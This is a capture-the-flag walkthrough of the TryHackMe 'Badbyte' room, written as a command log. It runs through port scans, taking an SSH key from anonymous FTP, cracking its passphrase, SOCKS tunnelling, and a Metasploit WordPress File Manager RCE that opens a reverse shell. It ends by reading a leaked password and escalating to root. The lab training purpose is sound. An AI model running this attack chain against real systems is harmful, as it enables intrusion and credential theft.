+++
title = "Badbyte"
+++

# https://tryhackme.com/room/badbyte

```bash
=================================
10.201.39.154 -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.201.39.154' >> ~/.zshrc && source ~/.zshrc

sudo rustscan --no-banner -u $(ulimit -Hn) -b 65535 -t 2000 --scan-order "Random" -r 1-65535 -a $TARGET -- -oA $(date +%Y-%m-%d_%H%M)_rustscan -A
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protoc
| ssh-hostkey:
|   3072 32:38:0e:07:0b:23:af:3b:f5:0c:73:fa:33:17:33:a3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLXUAfgXgKjuRGPEUtJp1BZx1s6GyrIXMD4+2naMRH82iUNxwcCsQ
|   256 3a:7d:d6:43:b9:f9:db:4b:b5:ab:c6:42:0a:0e:be:7e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNtzQisrY0WRQUqUFyr
|   256 3f:ab:63:37:40:63:d9:96:a1:41:f0:b7:ea:dc:33:3f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBe4yylQ3IdlyarCKfNvKPpWBYxxoeZvWRooXD3qsw0H
30024/tcp open  ftp     syn-ack ttl 60 vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          1743 Mar 23  2021 id_rsa
|_-rw-r--r--    1 ftp      ftp            78 Mar 23  2021 note.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.13.93.54
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status

ftp -a -p -P 30024 $TARGET
-rw-r--r--    1 ftp      ftp          1743 Mar 23  2021 id_rsa
-rw-r--r--    1 ftp      ftp            78 Mar 23  2021 note.txt
// got these interesting files
I always forget my password. Just let me store an ssh key here.
- errorcauser
// user?: errorcauser

echo -e "anonymous\nguest\nget id_rsa target_id_rsa\nquit" | ftp -a -p -P 30024 $TARGET && chmod 600 ~/target_id_rsa

ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i ~/target_id_rsa -p 22 errorcauser@$TARGET
// requires passphrase for key

ssh2john ~/target_id_rsa > ~/target_id_rsa_john_format
john --wordlist=/usr/share/wordlists/rockyou.txt ~/target_id_rsa_john_format
// cupcake          (/home/vagrant/target_id_rsa)

ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i ~/target_id_rsa -p 22 errorcauser@$TARGET
// cupcake
// success!

# Setting up SOCKS proxy
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i ~/target_id_rsa -p 22 -D 1337 errorcauser@$TARGET -fN
# Set proxychains config
sudo sed -i '/^socks[45]/ s/^.*$/#&/' /etc/proxychains4.conf && echo 'socks5 127.0.0.1 1337' | sudo tee -a /etc/proxychains4.conf
# Scan (this technically scans the box im already on but without having the firewall interfere)
proxychains nmap -sT -A -p- 127.0.0.1
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 10.0p2 Debian 5 (protocol 2.0)
1337/tcp  open  waste?
5432/tcp  open  postgresql PostgreSQL DB 9.6.0 or later
| ssl-cert: Subject: commonName=root
| Subject Alternative Name: DNS:root
| Not valid before: 2025-07-10T16:27:57
|_Not valid after:  2035-07-08T16:27:57
|_ssl-date: TLS randomness does not represent time
40929/tcp open  http       Golang net/http server
|_http-title: Site doesnt have a title (text/plain; charset=utf-8).
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 Not Found
|     Date: Wed, 01 Oct 2025 21:24:53 GMT
|     Content-Length: 19
|     Content-Type: text/plain; charset=utf-8
|     404: Page Not Found
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions:
|     HTTP/1.0 404 Not Found
|     Date: Wed, 01 Oct 2025 21:24:38 GMT
|     Content-Length: 19
|     Content-Type: text/plain; charset=utf-8
|     404: Page Not Found
|   OfficeScan:
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header

sudo ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i ~/target_id_rsa -p 22 errorcauser@$TARGET -fN -L 3306:127.0.0.1:5432 -L 80:127.0.0.1:40929
// not working?

proxychains wpscan --url http://127.0.0.1
[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://127.0.0.1/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://127.0.0.1/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://127.0.0.1/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://127.0.0.1/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.3.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://127.0.0.1/, Match: 'WordPress 5.3.2'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:80  ...  OK00%  ETA: ??:??:??
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:80  ...  OK67%  ETA: 00:00:13
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:80  ...  OK54%  ETA: 00:00:08
 Checking Config Backups - Time: 00:00:08 <==============> (137 / 137) 100.00% Time: 00:00:08

[i] No Config Backups Found.

proxychains wpscan --url http://127.0.0.1:80 --enumerate ap --random-user-agent
// nothing

https://www.exploit-db.com/exploits/50420
https://nvd.nist.gov/vuln/detail/CVE-2020-25213

# will use SOCKS5 proxy
search wp file manager rce
use exploit/multi/http/wp_file_manager_rce
setg lHOST 10.13.93.54
setg LPORT 54321
setg RHOSTS 127.0.0.1
set Proxies socks5:127.0.0.1:1337
set ReverseAllowProxy true
show options
run
// success!

search -d / -f flag.txt
search -d / -f user.txt
search -d / -f root.txt

cat /home/cth/.viminfo
// mentions /var/log/bash.log
cat /var/log/bash.log
// ]0;cth@badbyte: ~[01;32mcth@badbyte[00m:[01;34m~[00m$ G00dP@$sw0rd2021[K0
// G00dP@$sw0rd2021

shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

sudo su
cat /root/root.txt
```